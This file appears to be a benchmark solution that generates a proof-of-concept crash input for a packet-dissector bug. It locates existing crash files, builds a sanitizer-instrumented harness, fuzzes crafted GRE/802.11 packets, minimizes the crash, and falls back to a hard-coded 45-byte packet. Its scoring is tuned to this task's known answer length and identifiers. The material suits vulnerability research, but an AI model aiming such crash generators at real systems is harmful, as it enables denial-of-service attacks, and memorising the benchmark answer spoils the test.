import os
import re
import io
import ast
import time
import json
import stat
import shlex
import base64
import random
import shutil
import tarfile
import tempfile
import subprocess
from typing import Dict, Optional, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory(prefix="arvo7024_") as td:
            root = self._prepare_source(src_path, td)

            poc = self._find_existing_poc(root)
            if poc is not None:
                return poc

            embedded = self._find_embedded_poc(root)
            if embedded is not None:
                return embedded

            gre_proto = self._extract_gre_80211_proto(root)

            exe, mode = self._build_and_locate_harness(root, td, time_budget=90.0)
            if exe is not None:
                crash = self._find_crash_input(exe, mode, gre_proto, time_budget=60.0)
                if crash is not None:
                    minimized = self._minimize(crash, exe, mode, time_budget=30.0)
                    return minimized

            if gre_proto is None:
                gre_proto = 0x0000
            return self._craft_default_poc(gre_proto)

    def _prepare_source(self, src_path: str, td: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        extract_dir = os.path.join(td, "src")
        os.makedirs(extract_dir, exist_ok=True)

        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            prefix = os.path.commonpath([abs_directory, abs_target])
            return prefix == abs_directory

        def safe_extract(tar: tarfile.TarFile, path: str) -> None:
            for member in tar.getmembers():
                member_path = os.path.join(path, member.name)
                if not is_within_directory(path, member_path):
                    continue
                tar.extract(member, path)

        try:
            with tarfile.open(src_path, "r:*") as tar:
                safe_extract(tar, extract_dir)
        except Exception:
            return src_path

        root = extract_dir
        try:
            entries = [os.path.join(extract_dir, e) for e in os.listdir(extract_dir)]
            dirs = [p for p in entries if os.path.isdir(p)]
            if len(dirs) == 1 and not any(os.path.isfile(p) for p in entries):
                root = dirs[0]
        except Exception:
            pass
        return root

    def _read_file_bytes(self, path: str, max_bytes: int = 2_000_000) -> Optional[bytes]:
        try:
            st = os.stat(path)
            if st.st_size > max_bytes:
                return None
            with open(path, "rb") as f:
                return f.read()
        except Exception:
            return None

    def _read_file_text(self, path: str, max_bytes: int = 500_000) -> Optional[str]:
        b = self._read_file_bytes(path, max_bytes=max_bytes)
        if b is None:
            return None
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _is_probably_text(self, data: bytes) -> bool:
        if not data:
            return True
        if b"\x00" in data:
            return False
        sample = data[:512]
        printable = sum((32 <= c <= 126) or c in (9, 10, 13) for c in sample)
        return printable / max(1, len(sample)) > 0.95

    def _find_existing_poc(self, root: str) -> Optional[bytes]:
        keywords = ("crash", "poc", "overflow", "stack", "cve", "bug", "issue", "7024", "arvo", "repro", "minimized")
        dir_hints = ("poc", "pocs", "crash", "crashes", "testcase", "testcases", "corpus", "regression", "inputs", "seeds", "fuzz", "artifacts")
        ignore_ext = {
            ".c", ".cc", ".cpp", ".h", ".hpp", ".py", ".md", ".txt", ".rst", ".json",
            ".yml", ".yaml", ".toml", ".cmake", ".mk", ".in", ".am", ".ac"
        }

        best_score = -10**9
        best_data = None

        for dirpath, _, filenames in os.walk(root):
            rel_dir = os.path.relpath(dirpath, root).lower()
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                ext = os.path.splitext(fn)[1].lower()
                if ext in ignore_ext:
                    continue
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 4096:
                    continue

                name_l = fn.lower()
                score = 0
                if st.st_size == 45:
                    score += 200000
                score += max(0, 5000 - st.st_size * 5)
                if any(k in name_l for k in keywords):
                    score += 20000
                if any(h in rel_dir for h in dir_hints):
                    score += 8000
                if ext in (".bin", ".raw", ".dat", ".pkt", ".pcap", ".pcapng", ".cap", ".input"):
                    score += 1500

                data = self._read_file_bytes(p, max_bytes=4096)
                if data is None:
                    continue
                if self._is_probably_text(data):
                    score -= 10000

                if score > best_score:
                    best_score = score
                    best_data = data

        if best_data is not None and best_score >= 9000:
            return best_data
        return None

    def _find_embedded_poc(self, root: str) -> Optional[bytes]:
        text_exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".py", ".txt", ".md", ".rst")
        best = None
        best_score = -10**9

        hex_array_re = re.compile(r'(?:0x[0-9a-fA-F]{2}\s*,\s*){8,}0x[0-9a-fA-F]{2}')
        c_escape_re = re.compile(r'(?:\\x[0-9a-fA-F]{2}){8,}')
        b64_re = re.compile(r'(?:(?:[A-Za-z0-9+/]{4}){6,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?)')

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if os.path.splitext(fn)[1].lower() not in text_exts:
                    continue
                p = os.path.join(dirpath, fn)
                txt = self._read_file_text(p, max_bytes=300_000)
                if not txt:
                    continue
                name_l = fn.lower()

                for m in hex_array_re.finditer(txt):
                    s = m.group(0)
                    vals = re.findall(r'0x([0-9a-fA-F]{2})', s)
                    if len(vals) < 8:
                        continue
                    data = bytes(int(v, 16) for v in vals)
                    score = 0
                    if len(data) == 45:
                        score += 100000
                    score += max(0, 10000 - len(data) * 10)
                    if any(k in name_l for k in ("poc", "crash", "minimized", "7024", "arvo")):
                        score += 5000
                    if score > best_score:
                        best_score = score
                        best = data

                for m in c_escape_re.finditer(txt):
                    s = m.group(0)
                    vals = re.findall(r'\\x([0-9a-fA-F]{2})', s)
                    if len(vals) < 8:
                        continue
                    data = bytes(int(v, 16) for v in vals)
                    score = 0
                    if len(data) == 45:
                        score += 90000
                    score += max(0, 9000 - len(data) * 10)
                    if any(k in name_l for k in ("poc", "crash", "minimized", "7024", "arvo")):
                        score += 5000
                    if score > best_score:
                        best_score = score
                        best = data

                if "base64" in txt.lower() or "b64" in txt.lower():
                    for m in b64_re.finditer(txt):
                        s = m.group(0)
                        if len(s) < 32 or len(s) > 4096:
                            continue
                        try:
                            data = base64.b64decode(s, validate=False)
                        except Exception:
                            continue
                        if not data or len(data) < 8 or len(data) > 4096:
                            continue
                        score = 0
                        if len(data) == 45:
                            score += 80000
                        score += max(0, 8000 - len(data) * 10)
                        if any(k in name_l for k in ("poc", "crash", "minimized", "7024", "arvo")):
                            score += 5000
                        if score > best_score:
                            best_score = score
                            best = data

        if best is not None and best_score >= 12000:
            return best
        return None

    def _collect_defines(self, root: str) -> Dict[str, str]:
        defines: Dict[str, str] = {}
        src_exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc")
        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$')
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if os.path.splitext(fn)[1].lower() not in src_exts:
                    continue
                p = os.path.join(dirpath, fn)
                txt = self._read_file_text(p, max_bytes=600_000)
                if not txt:
                    continue
                for line in txt.splitlines():
                    m = define_re.match(line)
                    if not m:
                        continue
                    name = m.group(1)
                    val = m.group(2).strip()
                    val = re.sub(r'//.*$', '', val).strip()
                    val = re.sub(r'/\*.*?\*/', '', val).strip()
                    if not val:
                        continue
                    if name in defines:
                        continue
                    if len(val) > 200:
                        continue
                    defines[name] = val
        return defines

    def _safe_eval_c_int_expr(self, expr: str, defines: Dict[str, str]) -> Optional[int]:
        if not expr:
            return None
        expr = expr.strip()
        expr = re.sub(r'/\*.*?\*/', ' ', expr, flags=re.S)
        expr = re.sub(r'//.*$', ' ', expr, flags=re.M).strip()

        if expr.startswith('"') or expr.startswith("'"):
            return None

        expr = re.sub(r'\b([0-9]+)([uUlL]+)\b', r'\1', expr)
        expr = re.sub(r'\b(0x[0-9a-fA-F]+)([uUlL]+)\b', r'\1', expr)

        expr = re.sub(r'\(\s*(?:unsigned|signed|long|short|int|char|size_t|guint\d+|gint\d+|uint\d+_t|int\d+_t)\s*\)', ' ', expr)

        expr = expr.replace("UINT32_C", "").replace("UINT16_C", "").replace("UINT8_C", "")
        expr = re.sub(r'UINT(?:8|16|32|64)_C\s*\(', '(', expr)

        if re.search(r'[^0-9A-Za-z_()\s+\-*/%<>&|^~]', expr):
            return None

        id_re = re.compile(r'\b[A-Za-z_]\w*\b')

        resolving: Dict[str, Optional[int]] = {}

        def resolve_name(name: str, depth: int = 0) -> Optional[int]:
            if name in resolving:
                return resolving[name]
            if depth > 20:
                return None
            if name not in defines:
                return None
            resolving[name] = None
            v = defines[name].strip()
            if v == name:
                return None
            if v.startswith('"') or v.startswith("'"):
                return None
            val = eval_expr(v, depth + 1)
            resolving[name] = val
            return val

        def eval_expr(e: str, depth: int = 0) -> Optional[int]:
            if depth > 30:
                return None
            e = e.strip()
            for _ in range(12):
                changed = False
                for ident in set(id_re.findall(e)):
                    if ident in ("sizeof", "true", "false", "NULL"):
                        continue
                    if ident in defines:
                        val = resolve_name(ident, depth + 1)
                        if val is None:
                            continue
                        e2 = re.sub(r'\b' + re.escape(ident) + r'\b', str(val), e)
                        if e2 != e:
                            e = e2
                            changed = True
                if not changed:
                    break

            if re.search(r'\b[A-Za-z_]\w*\b', e):
                return None

            try:
                node = ast.parse(e, mode="eval")
            except Exception:
                return None

            allowed = (
                ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant,
                ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod,
                ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor,
                ast.Invert, ast.USub, ast.UAdd, ast.Div, ast.Pow
            )

            def check(n: ast.AST) -> bool:
                if not isinstance(n, allowed):
                    return False
                for ch in ast.iter_child_nodes(n):
                    if not check(ch):
                        return False
                return True

            if not check(node):
                return None

            try:
                val = eval(compile(node, "<c_expr>", "eval"), {"__builtins__": {}}, {})
            except Exception:
                return None
            if not isinstance(val, int):
                try:
                    val = int(val)
                except Exception:
                    return None
            return val

        return eval_expr(expr, 0)

    def _extract_gre_80211_proto(self, root: str) -> Optional[int]:
        defines = self._collect_defines(root)
        src_exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc")
        call_re = re.compile(r'dissector_add_uint(?:_with_preference)?\s*\(\s*"gre\.proto"\s*,\s*([^,]+)\s*,', re.S)
        candidates: List[Tuple[int, str]] = []

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if os.path.splitext(fn)[1].lower() not in src_exts:
                    continue
                p = os.path.join(dirpath, fn)
                txt = self._read_file_text(p, max_bytes=800_000)
                if not txt:
                    continue
                if "gre.proto" not in txt:
                    continue
                for m in call_re.finditer(txt):
                    expr = m.group(1).strip()
                    start = max(0, m.start() - 400)
                    end = min(len(txt), m.end() + 400)
                    ctx = txt[start:end].lower()
                    score = 0
                    if "802.11" in ctx or "80211" in ctx or "ieee80211" in ctx or "wlan" in ctx:
                        score += 100
                    if "ieee 802.11" in ctx:
                        score += 20
                    candidates.append((score, expr))

        candidates.sort(reverse=True)
        for score, expr in candidates:
            v = self._safe_eval_c_int_expr(expr, defines)
            if v is not None and 0 <= v <= 0xFFFF:
                return v

        for name in ("GRE_PTYPE_IEEE802_11", "GRE_PTYPE_IEEE80211", "ETHERTYPE_IEEE802_11", "ETHERTYPE_IEEE80211"):
            v = self._safe_eval_c_int_expr(name, defines)
            if v is not None and 0 <= v <= 0xFFFF:
                return v

        return None

    def _which(self, exe: str) -> Optional[str]:
        p = shutil.which(exe)
        return p

    def _run(self, cmd: List[str], cwd: Optional[str] = None, env: Optional[Dict[str, str]] = None,
             timeout: float = 30.0, stdin_data: Optional[bytes] = None) -> Tuple[int, bytes, bytes]:
        try:
            p = subprocess.run(
                cmd,
                cwd=cwd,
                env=env,
                input=stdin_data,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout
            )
            return p.returncode, p.stdout, p.stderr
        except subprocess.TimeoutExpired as e:
            out = e.stdout if e.stdout is not None else b""
            err = e.stderr if e.stderr is not None else b""
            return 124, out, err
        except Exception:
            return 127, b"", b""

    def _build_and_locate_harness(self, root: str, td: str, time_budget: float = 90.0) -> Tuple[Optional[str], str]:
        start = time.monotonic()
        cmake = self._which("cmake")
        ninja = self._which("ninja")
        make = self._which("make")
        clang = self._which("clang")
        clangxx = self._which("clang++")
        gcc = self._which("gcc")
        gxx = self._which("g++")

        cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined"
        cxxflags = cflags
        ldflags = "-fsanitize=address,undefined"
        env = dict(os.environ)
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:allocator_may_return_null=1")
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "print_stacktrace=1:halt_on_error=1")
        env["CFLAGS"] = env.get("CFLAGS", cflags)
        env["CXXFLAGS"] = env.get("CXXFLAGS", cxxflags)
        env["LDFLAGS"] = env.get("LDFLAGS", ldflags)

        if clang:
            env["CC"] = env.get("CC", clang)
        elif gcc:
            env["CC"] = env.get("CC", gcc)
        if clangxx:
            env["CXX"] = env.get("CXX", clangxx)
        elif gxx:
            env["CXX"] = env.get("CXX", gxx)

        build_dir = os.path.join(td, "build")
        os.makedirs(build_dir, exist_ok=True)

        def find_exes(search_root: str) -> List[str]:
            exes: List[str] = []
            for dp, _, fns in os.walk(search_root):
                for fn in fns:
                    p = os.path.join(dp, fn)
                    try:
                        st = os.stat(p)
                    except Exception:
                        continue
                    if st.st_size <= 0:
                        continue
                    if not (st.st_mode & stat.S_IXUSR):
                        continue
                    if fn.endswith(".so") or fn.endswith(".a") or fn.endswith(".o"):
                        continue
                    try:
                        with open(p, "rb") as f:
                            if f.read(4) != b"\x7fELF":
                                continue
                    except Exception:
                        continue
                    exes.append(p)
            return exes

        def pick_best(exes: List[str]) -> Optional[str]:
            if not exes:
                return None
            pats = ("poc", "harness", "fuzz", "dissect", "parser", "repro", "testoneinput", "main", "run")
            best = None
            best_score = -10**9
            for p in exes:
                fn = os.path.basename(p).lower()
                score = 0
                for i, pat in enumerate(pats):
                    if pat in fn:
                        score += 2000 - i * 100
                try:
                    st = os.stat(p)
                    score += max(0, 5000000 - st.st_size) // 1000
                except Exception:
                    pass
                if score > best_score:
                    best_score = score
                    best = p
            return best

        def time_left() -> float:
            return max(0.0, time_budget - (time.monotonic() - start))

        def try_cmake() -> Optional[str]:
            if not cmake:
                return None
            if not os.path.exists(os.path.join(root, "CMakeLists.txt")):
                return None
            gen = []
            if ninja:
                gen = ["-G", "Ninja"]
            rc, _, _ = self._run([cmake, "-S", root, "-B", build_dir] + gen + [
                "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
                f"-DCMAKE_C_FLAGS={cflags}",
                f"-DCMAKE_CXX_FLAGS={cxxflags}",
                f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
            ], cwd=root, env=env, timeout=min(30.0, time_left()))
            if rc != 0:
                rc, _, _ = self._run([cmake, "-S", root, "-B", build_dir] + gen + [
                    "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
                ], cwd=root, env=env, timeout=min(30.0, time_left()))
                if rc != 0:
                    return None
            build_cmd = [cmake, "--build", build_dir, "-j", "8"]
            rc, _, _ = self._run(build_cmd, cwd=root, env=env, timeout=min(60.0, time_left()))
            if rc != 0:
                return None
            exes = find_exes(build_dir)
            return pick_best(exes)

        def try_make() -> Optional[str]:
            if not make:
                return None
            if not os.path.exists(os.path.join(root, "Makefile")) and not os.path.exists(os.path.join(root, "makefile")):
                return None
            rc, _, _ = self._run([make, "-j", "8"], cwd=root, env=env, timeout=min(60.0, time_left()))
            if rc != 0:
                rc, _, _ = self._run([make, "-j", "8", f"CFLAGS={cflags}", f"CXXFLAGS={cxxflags}", f"LDFLAGS={ldflags}"],
                                     cwd=root, env=env, timeout=min(60.0, time_left()))
                if rc != 0:
                    return None
            exes = find_exes(root)
            return pick_best(exes)

        exe = try_cmake()
        if exe is None and time_left() > 10.0:
            exe = try_make()

        if exe is None:
            return None, "stdin"

        mode = self._detect_mode(exe, root)
        return exe, mode

    def _detect_mode(self, exe: str, cwd: str) -> str:
        test = b"\x00" * 16
        rc1, out1, err1 = self._run([exe], cwd=cwd, env=os.environ, timeout=0.7, stdin_data=test)
        s = (out1 + err1).lower()
        if rc1 in (0, 1, 2) and (b"usage" in s or b"argument" in s or b"file" in s or b"input" in s):
            with tempfile.NamedTemporaryFile(prefix="inp_", delete=True) as tf:
                tf.write(test)
                tf.flush()
                rc2, out2, err2 = self._run([exe, tf.name], cwd=cwd, env=os.environ, timeout=0.7, stdin_data=None)
                s2 = (out2 + err2).lower()
                if rc2 != 127 and not (b"usage" in s2 and rc2 != 0):
                    return "file"
        if rc1 != 127:
            return "stdin"
        return "file"

    def _is_crash(self, returncode: int, stderr: bytes) -> bool:
        if returncode < 0:
            return True
        if returncode == 124 or returncode == 127:
            return False
        e = stderr.lower()
        if b"addresssanitizer" in e and b"error:" in e:
            return True
        if b"stack-buffer-overflow" in e:
            return True
        if b"heap-buffer-overflow" in e:
            return True
        if b"undefinedbehavior" in e:
            return True
        if b"runtime error:" in e and (b"ubsan" in e or b"undefined" in e):
            return True
        if b"segmentation fault" in e or b"sigsegv" in e:
            return True
        return False

    def _run_harness(self, exe: str, mode: str, data: bytes, timeout: float = 0.8) -> bool:
        env = dict(os.environ)
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:allocator_may_return_null=1")
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "print_stacktrace=1:halt_on_error=1")

        if mode == "file":
            with tempfile.NamedTemporaryFile(prefix="poc_", delete=True) as tf:
                tf.write(data)
                tf.flush()
                rc, _, err = self._run([exe, tf.name], cwd=None, env=env, timeout=timeout, stdin_data=None)
                return self._is_crash(rc, err)
        else:
            rc, _, err = self._run([exe], cwd=None, env=env, timeout=timeout, stdin_data=data)
            return self._is_crash(rc, err)

    def _pack_u16be(self, v: int) -> bytes:
        v &= 0xFFFF
        return bytes([(v >> 8) & 0xFF, v & 0xFF])

    def _pack_u32be(self, v: int) -> bytes:
        v &= 0xFFFFFFFF
        return bytes([(v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])

    def _craft_gre_packet(self, flags: int, proto: int, opt_words: List[bytes], payload: bytes) -> bytes:
        hdr = self._pack_u16be(flags) + self._pack_u16be(proto)
        for w in opt_words:
            hdr += w
        return hdr + payload

    def _craft_min_80211_frame(self, payload_len: int) -> bytes:
        base = bytearray()
        base += b"\x08\x00"  # Frame Control: Data
        base += b"\x00\x00"  # Duration
        base += b"\x00" * 6  # Addr1
        base += b"\x00" * 6  # Addr2
        base += b"\x00" * 6  # Addr3
        base += b"\x00\x00"  # Seq ctrl
        if payload_len < 0:
            payload_len = 0
        if payload_len < len(base):
            return bytes(base[:payload_len])
        return bytes(base) + (b"\x00" * (payload_len - len(base)))

    def _craft_default_poc(self, gre_proto: int) -> bytes:
        flags = 0x3000  # K + S
        opt = [
            self._pack_u32be(0xFFFFFFFF),  # Key
            self._pack_u32be(0xFFFFFFFF),  # Seq
        ]
        payload = self._craft_min_80211_frame(33)
        pkt = self._craft_gre_packet(flags, gre_proto, opt, payload)
        if len(pkt) < 45:
            pkt += b"\x00" * (45 - len(pkt))
        elif len(pkt) > 45:
            pkt = pkt[:45]
        return pkt

    def _generate_candidates(self, gre_proto: int) -> List[bytes]:
        interesting_u32 = [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF, 0x41414141, 0x0000FFFF, 0xFFFF0000]
        interesting_u16 = [0x0000, 0x2000, 0x1000, 0x3000, 0x8000, 0xA000, 0xB000, 0x9000]

        cands: List[bytes] = []

        for flags in interesting_u16:
            flags &= 0xFFF8  # keep version bits 0
            opt = []
            if flags & 0x8000:
                opt.append(self._pack_u16be(0xFFFF) + self._pack_u16be(0x0000))  # checksum + reserved1
            if flags & 0x2000:
                for k in interesting_u32[:6]:
                    opt2 = opt + [self._pack_u32be(k)]
                    if flags & 0x1000:
                        for s in interesting_u32[:6]:
                            opt3 = opt2 + [self._pack_u32be(s)]
                            for plen in (0, 1, 8, 16, 24, 29, 33, 41, 64):
                                payload = self._craft_min_80211_frame(plen)
                                cands.append(self._craft_gre_packet(flags, gre_proto, opt3, payload))
                    else:
                        for plen in (0, 1, 8, 16, 24, 29, 33, 41, 64):
                            payload = self._craft_min_80211_frame(plen)
                            cands.append(self._craft_gre_packet(flags, gre_proto, opt2, payload))
            elif flags & 0x1000:
                for s in interesting_u32[:6]:
                    opt2 = opt + [self._pack_u32be(s)]
                    for plen in (0, 1, 8, 16, 24, 29, 33, 41, 64):
                        payload = self._craft_min_80211_frame(plen)
                        cands.append(self._craft_gre_packet(flags, gre_proto, opt2, payload))
            else:
                for plen in (0, 1, 8, 16, 24, 29, 33, 41, 64):
                    payload = self._craft_min_80211_frame(plen)
                    cands.append(self._craft_gre_packet(flags, gre_proto, opt, payload))

        base = self._craft_default_poc(gre_proto)
        cands.append(base)
        cands.append(b"\x00" * 45)
        cands.append(b"\xFF" * 45)
        cands.append(b"\x00\x00" + self._pack_u16be(gre_proto) + b"\x00" * 41)

        uniq = []
        seen = set()
        for c in cands:
            if c in seen:
                continue
            seen.add(c)
            uniq.append(c)
        uniq.sort(key=len)
        return uniq

    def _mutate(self, data: bytes, rng: random.Random) -> bytes:
        b = bytearray(data)
        if not b:
            b = bytearray(b"\x00")
        op = rng.randrange(6)
        if op == 0:
            i = rng.randrange(len(b))
            bit = 1 << rng.randrange(8)
            b[i] ^= bit
        elif op == 1:
            i = rng.randrange(len(b))
            b[i] = rng.randrange(256)
        elif op == 2:
            if len(b) >= 2:
                i = rng.randrange(len(b) - 1)
                v = rng.choice([0, 1, 0x7FFF, 0x8000, 0xFFFF, 0x0100, 0x00FF])
                b[i] = (v >> 8) & 0xFF
                b[i + 1] = v & 0xFF
        elif op == 3:
            if len(b) >= 4:
                i = rng.randrange(len(b) - 3)
                v = rng.choice([0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF, 0x41414141])
                b[i:i + 4] = self._pack_u32be(v)
        elif op == 4:
            if len(b) < 512:
                n = rng.randrange(1, 9)
                ins = bytes(rng.randrange(256) for _ in range(n))
                i = rng.randrange(len(b) + 1)
                b[i:i] = ins
        else:
            if len(b) > 1:
                n = rng.randrange(1, min(9, len(b)))
                i = rng.randrange(len(b) - n + 1)
                del b[i:i + n]

        if len(b) > 1024:
            b = b[:1024]
        return bytes(b)

    def _find_crash_input(self, exe: str, mode: str, gre_proto: Optional[int], time_budget: float = 60.0) -> Optional[bytes]:
        start = time.monotonic()
        if gre_proto is None:
            gre_proto = 0

        seeds = self._generate_candidates(gre_proto)
        for s in seeds:
            if self._run_harness(exe, mode, s, timeout=1.0):
                return s

        rng = random.Random(0x7024)
        base = self._craft_default_poc(gre_proto)
        current = base

        while time.monotonic() - start < time_budget:
            cand = self._mutate(current, rng)
            if self._run_harness(exe, mode, cand, timeout=1.0):
                return cand
            if rng.random() < 0.2:
                current = cand

        return None

    def _minimize(self, data: bytes, exe: str, mode: str, time_budget: float = 30.0) -> bytes:
        start = time.monotonic()

        def still_crashes(d: bytes) -> bool:
            return self._run_harness(exe, mode, d, timeout=1.2)

        if not still_crashes(data):
            return data

        d = data

        while len(d) > 1 and time.monotonic() - start < time_budget:
            d2 = d[:-1]
            if still_crashes(d2):
                d = d2
            else:
                break

        n = len(d)
        chunk = max(1, n // 2)
        while chunk >= 1 and time.monotonic() - start < time_budget:
            changed = False
            i = 0
            while i + chunk <= len(d) and time.monotonic() - start < time_budget:
                d2 = d[:i] + d[i + chunk:]
                if d2 and still_crashes(d2):
                    d = d2
                    changed = True
                else:
                    i += chunk
            if not changed:
                chunk //= 2

        for target_len in (45, 44, 43, 46, 47, 48):
            if time.monotonic() - start >= time_budget:
                break
            if len(d) > target_len:
                d2 = d[:target_len]
                if still_crashes(d2):
                    d = d2

        return d